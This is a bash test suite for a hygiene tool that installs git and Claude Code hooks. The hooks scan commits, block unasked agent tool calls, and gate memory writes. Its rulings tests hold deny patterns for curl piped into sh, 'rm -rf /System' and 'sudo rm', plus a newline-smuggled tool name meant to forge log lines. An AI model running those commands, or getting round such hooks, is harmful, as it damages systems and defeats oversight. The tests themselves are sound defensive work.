@@ -1,0 +1,618 @@
+#!/usr/bin/env bash
+# test/run — the precision suite.
+#
+# Most of these are NEGATIVE tests: ordinary code and ordinary prose that must
+# pass. A scanner that flags a normal codebase gets uninstalled the same day, so
+# a false positive is a worse bug here than a miss.
+#
+# Add a test before adding a pattern.
+
+set -uo pipefail
+HYG="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
+PASS=0; FAIL=0
+
+ok()   { PASS=$((PASS+1)); printf '  \033[32m✓\033[0m %s\n' "$1"; }
+bad()  { FAIL=$((FAIL+1)); printf '  \033[31m✗\033[0m %s\n' "$1"; }
+check(){ [ "$2" = "$3" ] && ok "$1" || bad "$1  (expected $3, got $2)"; }
+
+newrepo() {
+  local d="$TMP/$1"; rm -rf "$d"; mkdir -p "$d/content"
+  git -C "$d" init -q -b main
+  git -C "$d" config user.email t@t; git -C "$d" config user.name t
+  printf 'export const a=1;\n' > "$d/seed.ts"
+  "$HYG/install" "$d" >/dev/null 2>&1
+  git -C "$d" add -A >/dev/null; git -C "$d" commit -q -m "feat: seed" >/dev/null 2>&1
+  printf '%s' "$d"
+}
+
+# Never write outside the sandbox. An earlier version of this file relied on a
+# `cd` inside a $(…) subshell, which does not persist — and it committed test
+# fixtures into the repo the suite was run from.
+guard() {
+  case "$1" in
+    "$TMP"/*) : ;;
+    *) printf '\n  ABORT: refusing to write outside %s (got %s)\n\n' "$TMP" "$1" >&2
+       exit 1 ;;
+  esac
+}
+
+# commits <repo> <file> <contents> <message>  -> "pass" | "block"
+commits() {
+  guard "$1"
+  printf '%s' "$3" > "$1/$2"
+  git -C "$1" add -A >/dev/null 2>&1
+  if git -C "$1" commit -q -m "$4" >/dev/null 2>&1; then printf 'pass'; else
+    # Remove the fixture, or `git add -A` re-stages it in every later test and
+    # every subsequent commit is blocked by the *previous* test's file.
+    git -C "$1" reset -q HEAD >/dev/null 2>&1; rm -f "$1/$2"; printf 'block'; fi
+}
+
+echo
+echo "  ── comments that describe code must PASS ────────────────"
+D="$(newrepo a)"
+check "plain code"                "$(commits "$D" x.ts 'export const x=1;' 'feat: x')" pass
+check "'can never block a deploy'" \
+  "$(commits "$D" y.ts '// a CDN outage can never block a deploy
+export const y=1;' 'feat: y')" pass
+check "'do not let a hung gateway hang the UI'" \
+  "$(commits "$D" z.ts '// do not let a hung gateway hang the UI
+export const z=1;' 'feat: z')" pass
+check "'returns null when the cache is cold'" \
+  "$(commits "$D" w.ts '// returns null when the cache is cold
+export const w=1;' 'feat: w')" pass
+check "TODO without a ruling" \
+  "$(commits "$D" t.ts '// TODO: handle the empty case
+export const t=1;' 'feat: t')" pass
+check "ISO date in an ordinary source comment" \
+  "$(commits "$D" date.ts '// ISO 8601 example: 2026-09-01
+export const date="2026-09-01";' 'test: date example')" pass
+mkdir -p "$D/tests/unit" "$D/__tests__" "$D/spec"
+check "hardcoded date in tests/ fixture" \
+  "$(commits "$D" tests/unit/date.ts '// Fixture boundary 2026-09-01
+export const date="2026-09-01";' 'test: fixed date fixture')" pass
+check "governance-like prose in __tests__/ remains test data" \
+  "$(commits "$D" __tests__/messages.ts '// NEVER change this expected fixture
+export const message="NEVER change this";' 'test: instruction fixture')" pass
+check "spec/ directory is recognized as a test suite" \
+  "$(commits "$D" spec/date_spec.rb '# Boundary 2026-09-01
+DATE = "2026-09-01"' 'test: ruby date fixture')" pass
+
+echo
+echo "  ── product prose in exempt paths must PASS ──────────────"
+check "content/ 'we do not sell your data, we never share it'" \
+  "$(commits "$D" content/legal.ts 'export const s="We do not sell your data. We never share it.";' 'docs: legal')" pass
+
+echo
+echo "  ── governance must BLOCK ───────────────────────────────"
+check "⛔ marker + ALL CAPS + date + doc ref" \
+  "$(commits "$D" g1.ts '// ⛔ NEVER change this — owner ruling 2026-08-08, see DESIGN.md §12
+export const g=1;' 'feat: g')" block
+check "'never change this file by hand'" \
+  "$(commits "$D" g2.ts '// never change this file by hand
+export const g2=1;' 'feat: g2')" block
+check "owner law" \
+  "$(commits "$D" g3.ts '// Owner law: price lives below the fold
+export const g3=1;' 'feat: g3')" block
+check "descriptive incident date in production code" \
+  "$(commits "$D" gdate.ts '// Incident snapshot 2026-09-01
+export const gd=1;' 'feat: dated incident')" pass
+check "argument residue" \
+  "$(commits "$D" g4.ts '// the owner rejected this twice; we reverted it the third time
+export const g4=1;' 'feat: g4')" block
+check "attributed preference in project prose" \
+  "$(commits "$D" memory.md 'The user wanted the blue version after the discussion.' 'docs: memory')" block
+check "impersonal conceptual prose" \
+  "$(commits "$D" architecture.md 'Monetary amounts use integer minor units.' 'docs: architecture')" pass
+
+B="$(newrepo blocked-message)"
+printf '%s\n' '// Owner ruling: never change this file by hand' 'export const b=1;' > "$B/blocked.ts"
+git -C "$B" add blocked.ts >/dev/null 2>&1
+BLOCK_MSG="$(git -C "$B" commit -m 'test: exercise block guidance' 2>&1)"
+check "block message rejects route-changing workarounds" \
+  "$(printf '%s' "$BLOCK_MSG" | grep -c 'Do not move, reword, unstage, exempt, or bypass')" 1
+check "block message prescribes the project scanner" \
+  "$(printf '%s' "$BLOCK_MSG" | grep -c '\.githooks/scan')" 1
+check "installed project scanner is executable" \
+  "$([ -x "$B/.githooks/scan" ] && echo yes || echo no)" yes
+check "installed project scanner runs independently" \
+  "$("$B/.githooks/scan" "$B" 2>/dev/null | grep -c 'governance in comments')" 1
+
+echo
+echo "  ── commit messages ─────────────────────────────────────"
+check "conventional passes"      "$(commits "$D" m1.ts 'export const m1=1;' 'fix(nav): point CTA at membership')" pass
+check "'Handoff:' blocks"        "$(commits "$D" m2.ts 'export const m2=1;' 'Handoff: nav corrections')" block
+check "'wip' blocks"             "$(commits "$D" m3.ts 'export const m3=1;' 'wip')" block
+check "'added a thing' blocks"   "$(commits "$D" m4.ts 'export const m4=1;' 'added a thing')" block
+check "Merge commits pass"       "$(commits "$D" m5.ts 'export const m5=1;' 'Merge branch feature/x')" pass
+
+echo
+echo "  ── scan is read-only and honest ────────────────────────"
+BEFORE="$(git -C "$D" status --porcelain | wc -l | tr -d ' ')"
+"$HYG/bin/scan" "$D" >/dev/null 2>&1
+check "scan exits 0"             "$?" 0
+check "scan writes nothing"      "$(git -C "$D" status --porcelain | wc -l | tr -d ' ')" "$BEFORE"
+
+CLEAN="$TMP/clean"; mkdir -p "$CLEAN"
+{ echo '// Money is stored in minor units; callers pass integers.'
+  echo 'export function add(a, b) { return a + b; }'
+  for i in $(seq 1 30); do echo "export const k$i = $i;"; done
+  echo '// Falls back to the default locale when the header is absent.'
+  echo 'export const locale = (h) => h || "en";'
+} > "$CLEAN/m.ts"
+check "clean repo reports clean" \
+  "$("$HYG/bin/scan" "$CLEAN" 2>/dev/null | grep -c 'clean\.')" 1
+
+UNTRACKED="$(newrepo untracked-scan)"
+printf '%s\n' '// Owner ruling: never change this file' > "$UNTRACKED/new-source.ts"
+printf '%s\n' 'ignored-source.ts' > "$UNTRACKED/.gitignore"
+printf '%s\n' '// Owner ruling: never change this file' > "$UNTRACKED/ignored-source.ts"
+SCAN_NEW="$("$HYG/bin/scan" "$UNTRACKED" 2>/dev/null)"
+check "scan includes untracked source" "$(printf '%s' "$SCAN_NEW" | grep -c 'new-source.ts')" 1
+check "scan respects gitignored source" "$(printf '%s' "$SCAN_NEW" | grep -c 'ignored-source.ts')" 0
+
+echo
+echo "  ── lifecycle ───────────────────────────────────────────"
+check "install is idempotent" \
+  "$("$HYG/install" "$D" 2>/dev/null | grep -c 'already at')" 1
+"$HYG/uninstall" "$D" >/dev/null 2>&1
+check "uninstall unsets hooksPath" "$(git -C "$D" config --get core.hooksPath || echo unset)" unset
+check "uninstall removes .githooks" "$([ -d "$D/.githooks" ] && echo present || echo gone)" gone
+
+echo
+echo "  ── rulings ─────────────────────────────────────────────"
+export HYGIENE_RULINGS="$TMP/rulings.txt"
+"$HYG/bin/rulings" add "never propose ship gates" '(ship|launch)[ -]?gate' >/dev/null
+check "matching sentence trips"  "$("$HYG/bin/rulings" test 'add a ship gate' | grep -c 'trips:')" 1
+check "unrelated sentence passes" "$("$HYG/bin/rulings" test 'deploy to railway' | grep -c 'trips nothing')" 1
+
+# Intake and backtests must only ever see fixture transcripts under $TMP.
+export HYGIENE_PROJECTS_DIR="$TMP/projects"
+mkdir -p "$HYGIENE_PROJECTS_DIR"
+
+if command -v python3 >/dev/null 2>&1; then
+  mkt() {
+    python3 - "$1" "$2" "$TMP/t.jsonl" <<'PY'
+import json,sys
+u,a,p = sys.argv[1],sys.argv[2],sys.argv[3]
+with open(p,'w') as f:
+    f.write(json.dumps({"type":"user","message":{"role":"user","content":u}})+"\n")
+    f.write(json.dumps({"type":"assistant","message":{"role":"assistant",
+        "content":[{"type":"text","text":a}]}})+"\n")
+PY
+    printf '{"transcript_path":"%s","stop_hook_active":false}' "$TMP/t.jsonl"
+  }
+  run(){ mkt "$1" "$2" | python3 "$HYG/claude/stop-rulings.py" >/dev/null 2>&1; \
+         [ $? = 2 ] && printf 'block' || printf 'pass'; }
+  check "unprompted mention blocks"  "$(run 'how do I deploy?' 'add a ship gate here')" block
+  check "user raised it first passes" "$(run 'what was the ship gate?' 'the ship gate blocked it')" pass
+  check "unrelated reply passes"      "$(run 'how do I deploy?' 'push to railway')" pass
+else
+  echo "  - python3 absent, skipping Stop hook tests"
+fi
+
+echo
+echo "  ── action rulings — PreToolUse ─────────────────────────"
+if command -v python3 >/dev/null 2>&1; then
+  PTR="$HYG/claude/pretooluse-rulings.py"
+  RUL="$HYG/bin/rulings"
+  AR="$TMP/action-rulings.txt"
+  export HYGIENE_RULINGS="$AR"
+
+  # mka <user_msg> <tool> <input_json> — a PreToolUse payload whose transcript
+  # holds one genuine user message. Paths in fixtures need not exist on disk;
+  # the hook only pattern-matches.
+  mka() {
+    python3 - "$1" "$2" "$3" "$TMP/a.jsonl" <<'PY'
+import json,sys
+u,tn,ti,p = sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4]
+with open(p,'w') as f:
+    f.write(json.dumps({"type":"user","message":{"role":"user","content":u}})+"\n")
+print(json.dumps({"transcript_path":p,"tool_name":tn,"tool_input":json.loads(ti)}))
+PY
+  }
+  runa(){ mka "$1" "$2" "$3" | python3 "$PTR" >/dev/null 2>&1; \
+          [ $? = 2 ] && printf 'block' || printf 'pass'; }
+
+  : > "$AR"
+  check "empty rulings file: Write passes" \
+    "$(runa 'hi' Write '{"file_path":"/p/app.ts","content":"export const a=1;"}')" pass
+
+  printf '%s\n' 'never propose ship gates :: (ship|launch)[ -]?gate' > "$AR"
+  check "speech-only file: Write passes" \
+    "$(runa 'hi' Write '{"file_path":"/p/app.ts","content":"export const a=1;"}')" pass
+  check "speech regex matching an action stays speech" \
+    "$(runa 'hi' Write '{"file_path":"/p/app.ts","content":"add a ship gate"}')" pass
+
+  printf '%s\n' 'never: skills are not registered; skills-library only :: \.claude/skills/' > "$AR"
+  check "never: fires on file_path" \
+    "$(runa 'hi' Write '{"file_path":"/u/.claude/skills/x/SKILL.md","content":"x"}')" block
+  check "never: fires on content" \
+    "$(runa 'hi' Write '{"file_path":"/p/notes.txt","content":"ln -s here ~/.claude/skills/x"}')" block
+  check "never: fires through Bash" \
+    "$(runa 'hi' Bash '{"command":"mkdir -p ~/.claude/skills/x"}')" block
+  check "never: unrelated action passes" \
+    "$(runa 'hi' Write '{"file_path":"/p/app.ts","content":"export const a=1;"}')" pass
+  check "action ruling does not trip the Stop hook" \
+    "$(run 'how do I add a skill?' 'put it under ~/.claude/skills/ perhaps')" pass
+
+  printf '%s\n' 'ask: global npm installs need a yes :: npm install (-g|--global)' > "$AR"
+  check "ask: unrequested action blocks" \
+    "$(runa 'set up the project' Bash '{"command":"npm install -g typescript"}')" block
+  check "ask: stands down when the user asked" \
+    "$(runa 'please npm install -g typescript' Bash '{"command":"npm install -g typescript"}')" pass
+  MSG="$(mka 'set up the project' Bash '{"command":"npm install -g typescript"}' | python3 "$PTR" 2>&1 >/dev/null)"
+  check "block message names the ruling" \
+    "$(printf '%s' "$MSG" | grep -c 'global npm installs need a yes')" 1
+
+  printf '%s\n' 'never: broken :: ([unclosed' > "$AR"
+  check "malformed regex fails open" \
+    "$(runa 'hi' Write '{"file_path":"/u/.claude/skills/x","content":"x"}')" pass
+  printf 'not json' | python3 "$PTR" >/dev/null 2>&1
+  check "unparseable stdin exits 0" "$?" 0
+  printf '%s\n' 'never: no skill registration :: \.claude/skills/' > "$AR"
+  printf '{"transcript_path":"%s","tool_name":"Write","tool_input":{"file_path":"/u/.claude/skills/x"}}' \
+    "$TMP/absent.jsonl" | python3 "$PTR" >/dev/null 2>&1
+  check "missing transcript still evaluates" "$?" 2
+
+  check "blocks land in hits.log" "$([ -s "$TMP/hits.log" ] && echo yes || echo no)" yes
+  check "stats reports per-ruling counts" \
+    "$("$RUL" stats | grep -c 'skills are not registered')" 1
+
+  # A catastrophic-backtracking regex must fail open, not wedge the session.
+  printf '%s\n' 'never: redos probe :: (a+)+b$' > "$AR"
+  check "pathological regex cannot hang the hook" \
+    "$(runa 'hi' Write '{"file_path":"/p/x.ts","content":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}')" pass
+  printf '%s\n' 'never: no skill registration :: \.claude/skills/' > "$AR"
+  rm -f "$TMP/hits.log"
+  runa 'hi' 'Bash
+2026-01-01T00:00:00 never Fake :: forged' '{"command":"mkdir ~/.claude/skills/x"}' >/dev/null
+  check "a newline in tool_name cannot forge log lines" \
+    "$(wc -l < "$TMP/hits.log" | tr -d ' ')" 1
+  check "an injected separator cannot skew stats" \
+    "$("$RUL" stats | grep -c 'no skill registration')" 1
+
+  printf '%s\n' 'never propose ship gates :: (ship|launch)[ -]?gate' > "$AR"
+  printf '%s\n' 'ask: global npm installs need a yes :: npm install (-g|--global)' >> "$AR"
+  check "test-action reports the mode" \
+    "$("$RUL" test-action 'Bash
+npm install -g x' | grep -c 'ask:')" 1
+  check "test-action skips speech rulings" \
+    "$("$RUL" test-action 'add a ship gate' | grep -c 'trips nothing')" 1
+
+  echo
+  echo "  ── rulings intake ──────────────────────────────────────"
+  IN="$TMP/intake.txt"
+  export HYGIENE_RULINGS="$IN"
+  rm -f "$IN" "$TMP/hits.log"
+
+  "$RUL" add-never 'skills are not registered' '\.claude/skills/' >/dev/null 2>&1
+  check "add-never records a prefixed line" \
+    "$(grep -c '^never: skills are not registered' "$IN")" 1
+  "$RUL" add-never 'no skill registration' '\.claude/skills/' >/dev/null 2>&1
+  check "duplicate regex exits 3" "$?" 3
+  check "and writes nothing" "$(grep -c '^never:' "$IN")" 1
+  OUT="$("$RUL" add-ask 'skills need a yes' '\.claude/skills/' 2>&1)"; rc=$?
+  check "cross-mode collision exits 3" "$rc" 3
+  check "report shows the prior ruling" \
+    "$(printf '%s' "$OUT" | grep -c 'skills are not registered')" 1
+  check "report shows the new ruling" \
+    "$(printf '%s' "$OUT" | grep -c 'skills need a yes')" 1
+  "$RUL" add-ask --force 'skills need a yes' '\.claude/skills/' >/dev/null 2>&1
+  check "--force records anyway" "$(grep -c '^ask: skills need a yes' "$IN")" 1
+  "$RUL" add-never 'no piping curl into sh' 'curl[^|]*\| *sh' >/dev/null 2>&1
+  check "unrelated ruling records normally" \
+    "$(grep -c '^never: no piping curl into sh' "$IN")" 1
+
+  "$RUL" add-never 'match everything' '.*' >/dev/null 2>&1
+  check "degenerate regex exits 3" "$?" 3
+  mkdir -p "$TMP/projects/p1"
+  python3 - "$TMP/projects/p1/s.jsonl" <<'PY'
+import json,sys
+rec = {"type":"assistant","message":{"role":"assistant","content":[
+    {"type":"tool_use","name":"Bash","input":{"command":"brew install jq"}}]}}
+with open(sys.argv[1],'w') as f:
+    f.write(json.dumps(rec)+"\n")
+    rec["message"]["content"][0]["input"]["command"] = "brew install ripgrep"
+    f.write(json.dumps(rec)+"\n")
+PY
+  OUT="$("$RUL" add-never 'no unasked brew installs' 'brew install' 2>&1)"; rc=$?
+  check "historically noisy regex exits 3" "$rc" 3
+  check "with the would-have-fired count" \
+    "$(printf '%s' "$OUT" | grep -c 'fired 2 times')" 1
+  "$RUL" add-never 'no wiping system dirs' 'rm -rf /System' >/dev/null 2>&1
+  check "quiet regex records" "$(grep -c '^never: no wiping system dirs' "$IN")" 1
+  HYGIENE_PROJECTS_DIR="$TMP/absent-corpus" \
+    "$RUL" add-never 'no sudo removals' 'sudo rm' >/dev/null 2>&1
+  check "absent corpus still records" "$(grep -c '^never: no sudo removals' "$IN")" 1
+  python3 - "$TMP/projects/p1/redos.jsonl" <<'PY'
+import json,sys
+rec = {"type":"assistant","message":{"role":"assistant","content":[
+    {"type":"tool_use","name":"Bash","input":{"command":"a"*100}}]}}
+open(sys.argv[1],'w').write(json.dumps(rec)+"\n")
+PY
+  "$RUL" add-never 'redos guard' '(a+)+b$' >/dev/null 2>&1
+  check "regex too slow to evaluate exits 3" "$?" 3
+else
+  echo "  - python3 absent, skipping PreToolUse rulings tests"
+fi
+
+echo
+echo "  ── controlled memory promotion ─────────────────────────"
+if command -v python3 >/dev/null 2>&1; then
+  MEMORY="$HYG/bin/memory"
+  export HYGIENE_MEMORY_HOME="$TMP/memory-control"
+  MID="$($MEMORY propose concept --project "$D" --text 'Cache keys include the locale.' \
+        --evidence 'The implementation constructs locale-separated keys.' \
+        --evidence-file seed.ts | awk '{print $2}')"
+  check "candidate gets an opaque local id" \
+    "$(printf '%s' "$MID" | grep -Ec '^[0-9a-f]{12}$')" 1
+  check "proposal does not write project memory" \
+    "$([ -e "$D/MEMORY.md" ] && echo wrote || echo quarantined)" quarantined
+  check "review lists this project's candidate" \
+    "$($MEMORY review --project "$D" | grep -c "$MID")" 1
+  check "candidate is bound to its project" \
+    "$($MEMORY show "$MID" --project "$TMP" >/dev/null 2>&1; echo $?)" 1
+
+  $MEMORY approve "$MID" --project "$D" --to MEMORY.md >/dev/null 2>&1
+  check "approval needs an explicit confirmation flag" "$?" 3
+  APPROVAL="$($MEMORY approve "$MID" --project "$D" --to MEMORY.md --yes | \
+              awk '/^approval /{print $2}')"
+  check "approval is content-bound" \
+    "$(printf '%s' "$APPROVAL" | grep -Ec '^[0-9a-f]{64}$')" 1
+  $MEMORY promote "$MID" --project "$D" --approval "$APPROVAL" >/dev/null 2>&1
+  check "approved candidate is promoted" "$?" 0
+  check "promoted memory carries its immutable id" \
+    "$(grep -c "hygiene-memory:$MID" "$D/MEMORY.md")" 1
+  $MEMORY promote "$MID" --project "$D" --approval "$APPROVAL" >/dev/null 2>&1
+  check "approval is single-use" "$?" 1
+
+  EID="$($MEMORY propose concept --project "$D" --text 'The seed exports one value.' \
+        --evidence 'The source artifact contains the export.' --evidence-file seed.ts | awk '{print $2}')"
+  EAPP="$($MEMORY approve "$EID" --project "$D" --to MEMORY.md --yes | \
+          awk '/^approval /{print $2}')"
+  printf 'export const changed=2;\n' > "$D/seed.ts"
+  $MEMORY promote "$EID" --project "$D" --approval "$EAPP" >/dev/null 2>&1
+  check "changed evidence invalidates approval" "$?" 1
+
+  $MEMORY propose concept --project "$D" --text 'The user wanted cache separation.' \
+    --evidence 'A discussion happened.' >/dev/null 2>&1
+  check "argument residue cannot enter quarantine" "$?" 1
+  $MEMORY propose concept --project "$D" --text 'Keep this for the task.' \
+    --evidence 'Temporary work.' --scope task >/dev/null 2>&1
+  check "task state remains ephemeral" "$?" 1
+  $MEMORY propose procedure --project "$D" --text 'Run the precision suite.' \
+    --verify 'The summary reports zero failures.' >/dev/null 2>&1
+  check "verifiable procedures can enter quarantine" "$?" 0
+else
+  echo "  - python3 absent, skipping controlled memory tests"
+fi
+
+echo
+echo "  ── Claude layer install ────────────────────────────────"
+if command -v python3 >/dev/null 2>&1; then
+  CLAUDE_HOME="$TMP/claude-home"
+  mkdir -p "$CLAUDE_HOME"
+  HOME="$CLAUDE_HOME" "$HYG/install-claude" >/dev/null 2>&1
+  check "installer ships the memory broker" \
+    "$([ -x "$CLAUDE_HOME/.claude/hygiene/bin/memory" ] && echo yes || echo no)" yes
+  check "installer disables immediate auto-memory publication" \
+    "$(python3 - "$CLAUDE_HOME/.claude/settings.json" <<'PY'
+import json,sys
+print(json.load(open(sys.argv[1])).get("autoMemoryEnabled"))
+PY
+)" False
+  HOME="$CLAUDE_HOME" "$HYG/install-claude" >/dev/null 2>&1
+  check "Claude layer install remains idempotent" \
+    "$(python3 - "$CLAUDE_HOME/.claude/settings.json" <<'PY'
+import json,sys
+d=json.load(open(sys.argv[1])); print(sum(
+    1 for group in d["hooks"]["PreToolUse"] for h in group["hooks"]
+    if h["command"].endswith("pretooluse-persistence.py")))
+PY
+)" 1
+  check "default install has no response-retry Stop hook" \
+    "$(python3 - "$CLAUDE_HOME/.claude/settings.json" <<'PY'
+import json,sys
+d=json.load(open(sys.argv[1])); print(sum(
+    1 for group in d.get("hooks", {}).get("Stop", []) for h in group["hooks"]
+    if h.get("command", "").endswith("stop-rulings.py")))
+PY
+)" 0
+  RETRY_HOME="$TMP/claude-response-retries"
+  mkdir -p "$RETRY_HOME"
+  HOME="$RETRY_HOME" "$HYG/install-claude" --response-retries >/dev/null 2>&1
+  check "response retries are explicitly installable" \
+    "$(python3 - "$RETRY_HOME/.claude/settings.json" <<'PY'
+import json,sys
+d=json.load(open(sys.argv[1])); print(sum(
+    1 for group in d["hooks"]["Stop"] for h in group["hooks"]
+    if h.get("command", "").endswith("stop-rulings.py")))
+PY
+)" 1
+  python3 - "$RETRY_HOME/.claude/settings.json" <<'PY'
+import json,sys
+p=sys.argv[1]; d=json.load(open(p))
+d["hooks"]["Stop"].append({"hooks":[{"type":"command","command":"/tmp/unrelated-stop"}]})
+with open(p,"w") as f: json.dump(d,f)
+PY
+  HOME="$RETRY_HOME" "$HYG/install-claude" >/dev/null 2>&1
+  check "default reinstall removes only Hygiene response retries" \
+    "$(python3 - "$RETRY_HOME/.claude/settings.json" <<'PY'
+import json,sys
+d=json.load(open(sys.argv[1])); commands=[h.get("command","")
+    for group in d["hooks"]["Stop"] for h in group["hooks"]]
+print(commands == ["/tmp/unrelated-stop"])
+PY
+)" True
+  check "installer registers one failed-commit guidance hook" \
+    "$(python3 - "$CLAUDE_HOME/.claude/settings.json" <<'PY'
+import json,sys
+d=json.load(open(sys.argv[1])); print(sum(
+    1 for group in d["hooks"]["PostToolUseFailure"] for h in group["hooks"]
+    if h["command"].endswith("posttooluse-commit-failure.py")))
+PY
+)" 1
+  POST="$HYG/claude/posttooluse-commit-failure.py"
+  POST_MSG="$(printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git commit -m test"}}' | python3 "$POST")"
+  check "failed commit reminder forbids relocation" \
+    "$(printf '%s' "$POST_MSG" | grep -c 'Relocating, rewording, unstaging')" 1
+  check "failed commit reminder requires scan-first diagnosis" \
+    "$(printf '%s' "$POST_MSG" | grep -c '\.githooks/scan')" 1
+  check "unrelated failed commands receive no Hygiene reminder" \
+    "$(printf '%s' '{"tool_name":"Bash","tool_input":{"command":"npm test"}}' | python3 "$POST" | wc -c | tr -d ' ')" 0
+  HARD_HOME="$TMP/claude-hardened"
+  mkdir -p "$HARD_HOME"
+  HOME="$HARD_HOME" "$HYG/install-claude" --harden >/dev/null 2>&1
+  check "hardened install enables fail-closed sandboxing" \
+    "$(python3 - "$HARD_HOME/.claude/settings.json" <<'PY'
+import json,sys
+s=json.load(open(sys.argv[1]))["sandbox"]
+print(s["enabled"] and s["failIfUnavailable"] and not s["allowUnsandboxedCommands"])
+PY
+)" True
+  check "hardened install protects its control directory" \
+    "$(python3 - "$HARD_HOME/.claude/settings.json" <<'PY'
+import json,sys
+d=json.load(open(sys.argv[1])); print(any(
+    p.endswith("/.claude/hygiene") for p in d["sandbox"]["filesystem"]["denyWrite"]))
+PY
+)" True
+else
+  echo "  - python3 absent, skipping Claude install tests"
+fi
+
+echo
+echo "  ── persistence hygiene — PreToolUse ────────────────────"
+if command -v python3 >/dev/null 2>&1; then
+  PERSIST="$HYG/claude/pretooluse-persistence.py"
+  runp(){ mka "$1" "$2" "$3" | python3 "$PERSIST" >/dev/null 2>&1; \
+          [ $? = 2 ] && printf 'block' || printf 'pass'; }
+
+  # mkshown <assistant_msg> <user_msg> <tool> <input_json> — a transcript
+  # where the assistant spoke first (e.g. quoted the proposed content), then
+  # the user replied, mirroring an AskUserQuestion round trip.
+  mkshown() {
+    python3 - "$1" "$2" "$3" "$4" "$TMP/a.jsonl" <<'PY'
+import json,sys
+am,um,tn,ti,p = sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5]
+with open(p,'w') as f:
+    f.write(json.dumps({"type":"assistant","message":{"role":"assistant","content":am}})+"\n")
+    f.write(json.dumps({"type":"user","message":{"role":"user","content":um}})+"\n")
+print(json.dumps({"transcript_path":p,"tool_name":tn,"tool_input":json.loads(ti)}))
+PY
+  }
+  runshown(){ mkshown "$1" "$2" "$3" "$4" | python3 "$PERSIST" >/dev/null 2>&1; \
+          [ $? = 2 ] && printf 'block' || printf 'pass'; }
+
+  check "ordinary source writes pass" \
+    "$(runp 'implement it' Write '{"file_path":"/p/app.ts","content":"export const user = wanted;"}')" pass
+  check "product prose stays exempt" \
+    "$(runp 'update the copy' Write '{"file_path":"/p/content/story.md","content":"The user wanted a faster checkout."}')" pass
+  check "impersonal project prose passes" \
+    "$(runp 'document the cache' Write '{"file_path":"/p/notes.md","content":"Cache keys include the locale."}')" pass
+  check "argument residue in project prose blocks" \
+    "$(runp 'document the cache' Write '{"file_path":"/p/notes.md","content":"The user rejected caching after we argued about it."}')" block
+  check "an explicit request cannot preserve an argument" \
+    "$(runp 'write that the user rejected caching' Write '{"file_path":"/p/notes.md","content":"The user rejected caching after the discussion."}')" block
+
+  check "unsolicited memory writes block" \
+    "$(runp 'finish the implementation' Write '{"file_path":"/p/MEMORY.md","content":"Cache keys include the locale."}')" block
+  check "relative auto-memory paths also block" \
+    "$(runp 'finish the implementation' Write '{"file_path":".claude/memory/cache.md","content":"Cache keys include the locale."}')" block
+  check "structured prose cannot bypass review" \
+    "$(runp 'finish the implementation' Write '{"file_path":"/p/MEMORY.md","content":"Concept: Cache keys include the locale.\nEvidence: The cache-key test asserts locale separation."}')" block
+  check "a requested direct memory write is now authorized" \
+    "$(runp 'please add this to memory: cache keys include the locale' Write '{"file_path":"/p/MEMORY.md","content":"Cache keys include the locale."}')" pass
+  check "a bare yes without shown content still blocks" \
+    "$(runp 'yes' Write '{"file_path":"/p/MEMORY.md","content":"Cache keys include the locale."}')" block
+  check "yes approving exactly what was shown passes" \
+    "$(runshown 'Proposed: Cache keys include the locale.' 'Yes, add as written' Write '{"file_path":"/p/MEMORY.md","content":"Cache keys include the locale."}')" pass
+  check "yes approving different content than what was shown still blocks" \
+    "$(runshown 'Proposed: cache keys are per-tenant.' 'Yes, add as written' Write '{"file_path":"/p/MEMORY.md","content":"Cache keys include the locale."}')" block
+  check "old residue can be removed" \
+    "$(runp 'clean the note' Edit '{"file_path":"/p/notes.md","old_string":"The user rejected caching.","new_string":"Cache keys include the locale."}')" pass
+
+  check "a requested location-free handoff passes" \
+    "$(runp 'write the handoff' Edit '{"file_path":"/p/CONTEXT.md","old_string":"old","new_string":"## Next\nConfirm the removal path still passes."}')" pass
+  check "a handoff containing a path blocks" \
+    "$(runp 'write the handoff' Edit '{"file_path":"/p/CONTEXT.md","old_string":"old","new_string":"## Next\nContinue in /Volumes/Elsewhere/app.ts."}')" block
+  check "an unsolicited handoff write blocks" \
+    "$(runp 'finish the feature' Write '{"file_path":"/p/CONTEXT.md","content":"## Next\nContinue the unfinished check."}')" block
+
+  check "residue written through Bash blocks" \
+    "$(runp 'document it' Bash '{"command":"printf %s \\\"the user wanted blue\\\" > notes.md"}')" block
+  check "residue cannot be moved into a skill through Bash" \
+    "$(runp 'write the skill' Bash '{"command":"printf %s \\\"the user asked, then I corrected it\\\" > ~/.claude/skills/example/SKILL.md"}')" block
+  check "reading prose through Bash passes" \
+    "$(runp 'inspect it' Bash '{"command":"grep -n \\\"the user wanted\\\" notes.md"}')" pass
+  check "candidate proposal command passes" \
+    "$(runp 'capture this as a candidate' Bash '{"command":"hygiene memory propose concept --text fact --evidence test"}')" pass
+  check "generic consent cannot approve a candidate" \
+    "$(runp 'yes' Bash '{"command":"hygiene memory approve abcdef123456 --to MEMORY.md --yes"}')" block
+  check "candidate-specific consent permits approval broker" \
+    "$(runp 'approve candidate abcdef123456' Bash '{"command":"hygiene memory approve abcdef123456 --to MEMORY.md --yes"}')" pass
+  check "direct broker path still needs candidate consent" \
+    "$(runp 'yes' Bash '{"command":"~/.claude/hygiene/bin/memory promote abcdef123456 --approval aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}')" block
+  check "direct edits to broker state block" \
+    "$(runp 'change it' Write '{"file_path":"/u/.claude/hygiene/memory-control/candidates/x.json","content":"{}"}')" block
+
+  export HYGIENE_RULINGS="/p/rulings.txt"
+  check "the rulings file remains owned by rulings intake" \
+    "$(runp 'record the ruling' Write '{"file_path":"/p/rulings.txt","content":"the user decided this"}')" pass
+  printf 'not json' | python3 "$PERSIST" >/dev/null 2>&1
+  check "persistence hook fails open on malformed input" "$?" 0
+else
+  echo "  - python3 absent, skipping persistence hygiene tests"
+fi
+
+echo
+echo "  ── governance hygiene — Claude PreToolUse ──────────────"
+PRE_HYG="$HYG/claude/pretooluse-hygiene.sh"
+runh(){ printf '%s' "$1" | "$PRE_HYG" >/dev/null 2>&1; \
